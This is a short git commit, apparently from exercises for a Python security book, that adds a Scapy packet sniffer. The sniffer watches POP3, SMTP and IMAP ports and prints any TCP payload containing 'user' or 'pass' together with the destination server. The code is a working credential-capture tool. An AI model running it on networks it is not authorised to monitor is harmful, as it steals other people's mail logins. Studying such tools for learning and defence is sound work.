6f7e9b8f5b73f3638312d37902c7bbbffa57bdda
ILUXONCHIK <iluxon4ik@hotmail.com>
2016-01-28 14:38:48 +0000

    Add mail sniffer

--- Chapter_04/mail_sniffer.py
+++ Chapter_04/mail_sniffer.py
@@ -2,7 +2,13 @@ from scapy.all import *
 
 # callback for each captured packet
 def packet_callback(packet):
-    print(packet.show())
+    if packet[TCP].payload:
+
+        mail_packet = str(packet[TCP].payload)
+
+        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
+            print("[*] Server: {0}".format(packet[IP].dst))
+            print("[*] {0}".format(packet[TCP].payload))
 
 # start the sniffer
-sniff(prn=packet_callback, count=1)
+sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
